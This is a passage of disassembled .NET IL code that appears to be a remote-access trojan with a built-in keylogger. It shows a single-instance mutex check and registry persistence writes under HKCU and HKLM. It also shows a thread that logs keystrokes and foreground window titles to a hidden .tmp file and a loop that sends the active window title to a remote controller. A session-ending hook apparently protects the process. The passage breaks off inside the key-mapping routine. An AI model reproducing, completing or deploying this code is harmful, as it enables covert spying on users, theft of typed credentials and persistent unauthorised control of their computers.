    IL_014d:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0152:  nop
    IL_0153:  nop
    IL_0154:  br.s       IL_0156

    IL_0156:  nop
    IL_0157:  nop
    IL_0158:  nop
    .try
    {
      IL_0159:  ldsfld     string ClassLibrary1.OK::RG
      IL_015e:  call       class [mscorlib]System.Threading.Mutex [mscorlib]System.Threading.Mutex::OpenExisting(string)
      IL_0163:  pop
      IL_0164:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0169:  nop
      IL_016a:  leave.s    IL_01b5

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_016c:  dup
      IL_016d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0172:  stloc.s    V_12
      IL_0174:  nop
      IL_0175:  ldloc.s    V_12
      IL_0177:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_017c:  nop
      IL_017d:  ldloc.s    V_12
      IL_017f:  stloc.s    V_13
      IL_0181:  ldc.i4.0
      IL_0182:  stloc.s    V_11
      IL_0184:  ldc.i4.1
      IL_0185:  ldsfld     string ClassLibrary1.OK::RG
      IL_018a:  ldloca.s   V_11
      IL_018c:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                                 string,
                                                                                 bool&)
      IL_0191:  stsfld     class [mscorlib]System.Threading.Mutex ClassLibrary1.OK::MT
      IL_0196:  ldloc.s    V_11
      IL_0198:  ldc.i4.0
      IL_0199:  ceq
      IL_019b:  stloc.s    V_29
      IL_019d:  ldloc.s    V_29
      IL_019f:  brfalse.s  IL_01a7

      IL_01a1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_01a6:  nop
      IL_01a7:  nop
      IL_01a8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01ad:  nop
      IL_01ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01b3:  leave.s    IL_01b5

    }  // end handler
    IL_01b5:  nop
    IL_01b6:  call       void ClassLibrary1.OK::INS()
    IL_01bb:  nop
    IL_01bc:  ldnull
    IL_01bd:  ldftn      void ClassLibrary1.OK::RC()
    IL_01c3:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_01c8:  ldc.i4.1
    IL_01c9:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_01ce:  stloc.0
    IL_01cf:  ldloc.0
    IL_01d0:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_01d5:  nop
    IL_01d6:  nop
    .try
    {
      IL_01d7:  newobj     instance void ClassLibrary1.kl::.ctor()
      IL_01dc:  stsfld     class ClassLibrary1.kl ClassLibrary1.OK::kq
      IL_01e1:  ldsfld     class ClassLibrary1.kl ClassLibrary1.OK::kq
      IL_01e6:  dup
      IL_01e7:  ldvirtftn  instance void ClassLibrary1.kl::WRK()
      IL_01ed:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_01f2:  ldc.i4.1
      IL_01f3:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_01f8:  stloc.s    V_14
      IL_01fa:  ldloc.s    V_14
      IL_01fc:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_0201:  nop
      IL_0202:  leave.s    IL_0226

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0204:  dup
      IL_0205:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_020a:  stloc.s    V_15
      IL_020c:  nop
      IL_020d:  ldloc.s    V_15
      IL_020f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0214:  nop
      IL_0215:  ldloc.s    V_15
      IL_0217:  stloc.s    V_16
      IL_0219:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_021e:  nop
      IL_021f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0224:  leave.s    IL_0226

    }  // end handler
    IL_0226:  nop
    IL_0227:  ldc.i4.0
    IL_0228:  stloc.1
    IL_0229:  ldstr      ""
    IL_022e:  stloc.2
    IL_022f:  ldsfld     bool ClassLibrary1.OK::BD
    IL_0234:  stloc.s    V_29
    IL_0236:  ldloc.s    V_29
    IL_0238:  brfalse.s  IL_0279

    IL_023a:  nop
    .try
    {
      IL_023b:  ldnull
      IL_023c:  ldftn      void ClassLibrary1.A::_Lambda__4(object,
                                                            class [System]Microsoft.Win32.SessionEndingEventArgs)
      IL_0242:  newobj     instance void [System]Microsoft.Win32.SessionEndingEventHandler::.ctor(object,
                                                                                                  native int)
      IL_0247:  call       void [System]Microsoft.Win32.SystemEvents::add_SessionEnding(class [System]Microsoft.Win32.SessionEndingEventHandler)
      IL_024c:  nop
      IL_024d:  ldc.i4.1
      IL_024e:  call       void ClassLibrary1.OK::pr(int32)
      IL_0253:  nop
      IL_0254:  leave.s    IL_0278

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0256:  dup
      IL_0257:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_025c:  stloc.s    V_17
      IL_025e:  nop
      IL_025f:  ldloc.s    V_17
      IL_0261:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0266:  nop
      IL_0267:  ldloc.s    V_17
      IL_0269:  stloc.s    V_18
      IL_026b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0270:  nop
      IL_0271:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0276:  leave.s    IL_0278

    }  // end handler
    IL_0278:  nop
    IL_0279:  nop
    IL_027a:  br         IL_04cc

    IL_027f:  ldc.i4     0x3e8
    IL_0284:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0289:  nop
    IL_028a:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    IL_028f:  nop
    IL_0290:  nop
    .try
    {
      IL_0291:  ldloc.1
      IL_0292:  ldc.i4.1
      IL_0293:  add.ovf
      IL_0294:  stloc.1
      IL_0295:  ldloc.1
      IL_0296:  ldc.i4.5
      IL_0297:  ceq
      IL_0299:  stloc.s    V_29
      IL_029b:  ldloc.s    V_29
      IL_029d:  brfalse.s  IL_02da

      IL_029f:  nop
      .try
      {
        IL_02a0:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_02a5:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
        IL_02aa:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
        IL_02af:  call       bool ClassLibrary1.OK::EmptyWorkingSet(int64)
        IL_02b4:  pop
        IL_02b5:  leave.s    IL_02d9

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02b7:  dup
        IL_02b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02bd:  stloc.s    V_19
        IL_02bf:  nop
        IL_02c0:  ldloc.s    V_19
        IL_02c2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02c7:  nop
        IL_02c8:  ldloc.s    V_19
        IL_02ca:  stloc.s    V_20
        IL_02cc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02d1:  nop
        IL_02d2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02d7:  leave.s    IL_02d9

      }  // end handler
      IL_02d9:  nop
      IL_02da:  nop
      IL_02db:  ldloc.1
      IL_02dc:  ldc.i4.8
      IL_02dd:  cgt
      IL_02df:  stloc.s    V_29
      IL_02e1:  ldloc.s    V_29
      IL_02e3:  brfalse.s  IL_031e

      IL_02e5:  ldc.i4.0
      IL_02e6:  stloc.1
      IL_02e7:  call       string ClassLibrary1.OK::ACT()
      IL_02ec:  stloc.s    V_21
      IL_02ee:  ldloc.2
      IL_02ef:  ldloc.s    V_21
      IL_02f1:  ldc.i4.0
      IL_02f2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02f7:  ldc.i4.0
      IL_02f8:  ceq
      IL_02fa:  ldc.i4.0
      IL_02fb:  ceq
      IL_02fd:  stloc.s    V_29
      IL_02ff:  ldloc.s    V_29
      IL_0301:  brfalse.s  IL_031d

      IL_0303:  ldloc.s    V_21
      IL_0305:  stloc.2
      IL_0306:  ldstr      "act"
      IL_030b:  ldsfld     string ClassLibrary1.OK::Y
      IL_0310:  ldloc.s    V_21
      IL_0312:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0317:  call       bool ClassLibrary1.OK::Send(string)
      IL_031c:  pop
      IL_031d:  nop
      IL_031e:  nop
      IL_031f:  ldsfld     bool ClassLibrary1.OK::Isu
      IL_0324:  stloc.s    V_29
      IL_0326:  ldloc.s    V_29
      IL_0328:  brfalse    IL_04a5

      IL_032d:  nop
      .try
      {
        IL_032e:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
        IL_0333:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0338:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_033d:  ldsfld     string ClassLibrary1.OK::sf
        IL_0342:  ldstr      "\\"
        IL_0347:  ldsfld     string ClassLibrary1.OK::RG
        IL_034c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0351:  ldstr      ""
        IL_0356:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_035b:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0360:  ldstr      "\""
        IL_0365:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
        IL_036a:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_036f:  ldstr      "\" .."
        IL_0374:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0379:  ldc.i4.0
        IL_037a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_037f:  stloc.s    V_30
        IL_0381:  ldloc.s    V_30
        IL_0383:  brfalse.s  IL_03c3

        IL_0385:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
        IL_038a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_038f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_0394:  ldsfld     string ClassLibrary1.OK::sf
        IL_0399:  ldc.i4.1
        IL_039a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_039f:  ldsfld     string ClassLibrary1.OK::RG
        IL_03a4:  ldstr      "\""
        IL_03a9:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
        IL_03ae:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_03b3:  ldstr      "\" .."
        IL_03b8:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_03bd:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_03c2:  nop
        IL_03c3:  nop
        IL_03c4:  leave.s    IL_03e8

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_03c6:  dup
        IL_03c7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_03cc:  stloc.s    V_22
        IL_03ce:  nop
        IL_03cf:  ldloc.s    V_22
        IL_03d1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_03d6:  nop
        IL_03d7:  ldloc.s    V_22
        IL_03d9:  stloc.s    V_23
        IL_03db:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03e0:  nop
        IL_03e1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03e6:  leave.s    IL_03e8

      }  // end handler
      IL_03e8:  nop
      IL_03e9:  nop
      .try
      {
        IL_03ea:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
        IL_03ef:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_03f4:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_03f9:  ldsfld     string ClassLibrary1.OK::sf
        IL_03fe:  ldstr      "\\"
        IL_0403:  ldsfld     string ClassLibrary1.OK::RG
        IL_0408:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_040d:  ldstr      ""
        IL_0412:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_0417:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_041c:  ldstr      "\""
        IL_0421:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
        IL_0426:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_042b:  ldstr      "\" .."
        IL_0430:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0435:  ldc.i4.0
        IL_0436:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_043b:  stloc.s    V_30
        IL_043d:  ldloc.s    V_30
        IL_043f:  brfalse.s  IL_047f

        IL_0441:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
        IL_0446:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_044b:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0450:  ldsfld     string ClassLibrary1.OK::sf
        IL_0455:  ldc.i4.1
        IL_0456:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_045b:  ldsfld     string ClassLibrary1.OK::RG
        IL_0460:  ldstr      "\""
        IL_0465:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
        IL_046a:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_046f:  ldstr      "\" .."
        IL_0474:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0479:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_047e:  nop
        IL_047f:  nop
        IL_0480:  leave.s    IL_04a4

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0482:  dup
        IL_0483:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0488:  stloc.s    V_24
        IL_048a:  nop
        IL_048b:  ldloc.s    V_24
        IL_048d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0492:  nop
        IL_0493:  ldloc.s    V_24
        IL_0495:  stloc.s    V_25
        IL_0497:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_049c:  nop
        IL_049d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_04a2:  leave.s    IL_04a4

      }  // end handler
      IL_04a4:  nop
      IL_04a5:  nop
      IL_04a6:  leave.s    IL_04ca

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_04a8:  dup
      IL_04a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_04ae:  stloc.s    V_27
      IL_04b0:  nop
      IL_04b1:  ldloc.s    V_27
      IL_04b3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_04b8:  nop
      IL_04b9:  ldloc.s    V_27
      IL_04bb:  stloc.s    V_26
      IL_04bd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_04c2:  nop
      IL_04c3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_04c8:  leave.s    IL_04ca

    }  // end handler
    IL_04ca:  nop
    IL_04cb:  nop
    IL_04cc:  ldc.i4.1
    IL_04cd:  stloc.s    V_30
    IL_04cf:  ldloc.s    V_30
    IL_04d1:  brtrue     IL_027f

    IL_04d6:  nop
    IL_04d7:  ret
  } // end of method A::main

} // end of class ClassLibrary1.A

.class public auto ansi ClassLibrary1.kl
       extends [mscorlib]System.Object
{
  .field public class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Clock Clock
  .field private class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard keyboard
  .field private string LastAS
  .field private int32 LastAV
  .field private valuetype [System.Windows.Forms]System.Windows.Forms.Keys lastKey
  .field public string Logs
  .field public string LogsPath
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       70 (0x46)
    .maxstack  3
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  ldarg.0
    IL_0008:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Clock::.ctor()
    IL_000d:  stfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Clock ClassLibrary1.kl::Clock
    IL_0012:  ldarg.0
    IL_0013:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::.ctor()
    IL_0018:  stfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard ClassLibrary1.kl::keyboard
    IL_001d:  ldarg.0
    IL_001e:  ldc.i4.0
    IL_001f:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys ClassLibrary1.kl::lastKey
    IL_0024:  ldarg.0
    IL_0025:  ldstr      ""
    IL_002a:  stfld      string ClassLibrary1.kl::Logs
    IL_002f:  ldarg.0
    IL_0030:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
    IL_0035:  ldstr      ".tmp"
    IL_003a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003f:  stfld      string ClassLibrary1.kl::LogsPath
    IL_0044:  nop
    IL_0045:  ret
  } // end of method kl::.ctor

  .method private instance string  AV() cil managed
  {
    // Code size       249 (0xf9)
    .maxstack  4
    .locals init (string V_0,
             native int V_1,
             int32 V_2,
             class [System]System.Diagnostics.Process V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             string[] V_6,
             bool V_7)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  call       native int ClassLibrary1.kl::GetForegroundWindow()
      IL_0007:  stloc.1
      IL_0008:  ldloc.1
      IL_0009:  ldloca.s   V_2
      IL_000b:  call       int32 ClassLibrary1.kl::GetWindowThreadProcessId(native int,
                                                                            int32&)
      IL_0010:  pop
      IL_0011:  ldloc.2
      IL_0012:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0017:  stloc.3
      IL_0018:  ldloca.s   V_1
      IL_001a:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_001f:  ldarg.0
      IL_0020:  ldfld      int32 ClassLibrary1.kl::LastAV
      IL_0025:  ceq
      IL_0027:  ldarg.0
      IL_0028:  ldfld      string ClassLibrary1.kl::LastAS
      IL_002d:  ldloc.3
      IL_002e:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0033:  ldc.i4.0
      IL_0034:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0039:  ldc.i4.0
      IL_003a:  ceq
      IL_003c:  and
      IL_003d:  ldloc.3
      IL_003e:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0043:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0048:  ldc.i4.0
      IL_0049:  ceq
      IL_004b:  or
      IL_004c:  ldc.i4.0
      IL_004d:  ceq
      IL_004f:  stloc.s    V_7
      IL_0051:  ldloc.s    V_7
      IL_0053:  brfalse.s  IL_00c9

      IL_0055:  ldarg.0
      IL_0056:  ldloca.s   V_1
      IL_0058:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_005d:  stfld      int32 ClassLibrary1.kl::LastAV
      IL_0062:  ldarg.0
      IL_0063:  ldloc.3
      IL_0064:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0069:  stfld      string ClassLibrary1.kl::LastAS
      IL_006e:  ldc.i4.7
      IL_006f:  newarr     [mscorlib]System.String
      IL_0074:  stloc.s    V_6
      IL_0076:  ldloc.s    V_6
      IL_0078:  ldc.i4.0
      IL_0079:  ldstr      bytearray (0D 00 0A 00 01 00 ) 
      IL_007e:  stelem.ref
      IL_007f:  nop
      IL_0080:  ldloc.s    V_6
      IL_0082:  ldc.i4.1
      IL_0083:  ldarg.0
      IL_0084:  callvirt   instance string ClassLibrary1.kl::HM()
      IL_0089:  stelem.ref
      IL_008a:  nop
      IL_008b:  ldloc.s    V_6
      IL_008d:  ldc.i4.2
      IL_008e:  ldstr      " "
      IL_0093:  stelem.ref
      IL_0094:  nop
      IL_0095:  ldloc.s    V_6
      IL_0097:  ldc.i4.3
      IL_0098:  ldloc.3
      IL_0099:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_009e:  stelem.ref
      IL_009f:  nop
      IL_00a0:  ldloc.s    V_6
      IL_00a2:  ldc.i4.4
      IL_00a3:  ldstr      " "
      IL_00a8:  stelem.ref
      IL_00a9:  nop
      IL_00aa:  ldloc.s    V_6
      IL_00ac:  ldc.i4.5
      IL_00ad:  ldarg.0
      IL_00ae:  ldfld      string ClassLibrary1.kl::LastAS
      IL_00b3:  stelem.ref
      IL_00b4:  nop
      IL_00b5:  ldloc.s    V_6
      IL_00b7:  ldc.i4.6
      IL_00b8:  ldstr      bytearray (01 00 0D 00 0A 00 ) 
      IL_00bd:  stelem.ref
      IL_00be:  nop
      IL_00bf:  ldloc.s    V_6
      IL_00c1:  call       string [mscorlib]System.String::Concat(string[])
      IL_00c6:  stloc.0
      IL_00c7:  leave.s    IL_00f7

      IL_00c9:  nop
      IL_00ca:  leave.s    IL_00ee

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00cc:  dup
      IL_00cd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d2:  stloc.s    V_5
      IL_00d4:  nop
      IL_00d5:  ldloc.s    V_5
      IL_00d7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00dc:  nop
      IL_00dd:  ldloc.s    V_5
      IL_00df:  stloc.s    V_4
      IL_00e1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e6:  nop
      IL_00e7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ec:  leave.s    IL_00ee

    }  // end handler
    IL_00ee:  nop
    IL_00ef:  ldstr      ""
    IL_00f4:  stloc.0
    IL_00f5:  br.s       IL_00f7

    IL_00f7:  ldloc.0
    IL_00f8:  ret
  } // end of method kl::AV

  .method private instance string  Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys k) cil managed
  {
    // Code size       586 (0x24a)
    .maxstack  3
    .locals init (string V_0,
             bool V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_5,
             char V_6,
             bool V_7,
             bool V_8)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard ClassLibrary1.kl::keyboard
    IL_0007:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_ShiftKeyDown()
    IL_000c:  stloc.1
    IL_000d:  ldarg.0
    IL_000e:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard ClassLibrary1.kl::keyboard
    IL_0013:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CapsLock()
    IL_0018:  stloc.s    V_7
    IL_001a:  ldloc.s    V_7
    IL_001c:  brfalse.s  IL_002d

    IL_001e:  ldloc.1
    IL_001f:  stloc.s    V_8
    IL_0021:  ldloc.s    V_8
    IL_0023:  brfalse.s  IL_0029

    IL_0025:  ldc.i4.0
    IL_0026:  stloc.1
    IL_0027:  br.s       IL_002c

    IL_0029:  nop
    IL_002a:  ldc.i4.1
    IL_002b:  stloc.1
    IL_002c:  nop
    IL_002d:  nop
    IL_002e:  nop
    .try
    {
      IL_002f:  nop
      IL_0030:  ldarg.1
      IL_0031:  stloc.s    V_5
      IL_0033:  nop
      IL_0034:  ldloc.s    V_5
      IL_0036:  ldc.i4.s   112
      IL_0038:  beq.s      IL_0040

      IL_003a:  ldloc.s    V_5
      IL_003c:  ldc.i4.s   113
      IL_003e:  bne.un.s   IL_0042

      IL_0040:  br.s       IL_0048

      IL_0042:  ldloc.s    V_5
      IL_0044:  ldc.i4.s   114
      IL_0046:  bne.un.s   IL_004a

      IL_0048:  br.s       IL_0050

      IL_004a:  ldloc.s    V_5
      IL_004c:  ldc.i4.s   115
      IL_004e:  bne.un.s   IL_0052

      IL_0050:  br.s       IL_0058

      IL_0052:  ldloc.s    V_5
      IL_0054:  ldc.i4.s   116
      IL_0056:  bne.un.s   IL_005a

      IL_0058:  br.s       IL_0060

      IL_005a:  ldloc.s    V_5
      IL_005c:  ldc.i4.s   117
      IL_005e:  bne.un.s   IL_0062

      IL_0060:  br.s       IL_0068

      IL_0062:  ldloc.s    V_5
      IL_0064:  ldc.i4.s   118
      IL_0066:  bne.un.s   IL_006a

      IL_0068:  br.s       IL_0070

      IL_006a:  ldloc.s    V_5
      IL_006c:  ldc.i4.s   119
      IL_006e:  bne.un.s   IL_0072

      IL_0070:  br.s       IL_0078

      IL_0072:  ldloc.s    V_5
      IL_0074:  ldc.i4.s   120
      IL_0076:  bne.un.s   IL_007a

      IL_0078:  br.s       IL_0080

      IL_007a:  ldloc.s    V_5
      IL_007c:  ldc.i4.s   121
      IL_007e:  bne.un.s   IL_0082

      IL_0080:  br.s       IL_0088

      IL_0082:  ldloc.s    V_5
      IL_0084:  ldc.i4.s   122
      IL_0086:  bne.un.s   IL_008a

      IL_0088:  br.s       IL_0090

      IL_008a:  ldloc.s    V_5
      IL_008c:  ldc.i4.s   123
      IL_008e:  bne.un.s   IL_0092

      IL_0090:  br.s       IL_0098

      IL_0092:  ldloc.s    V_5
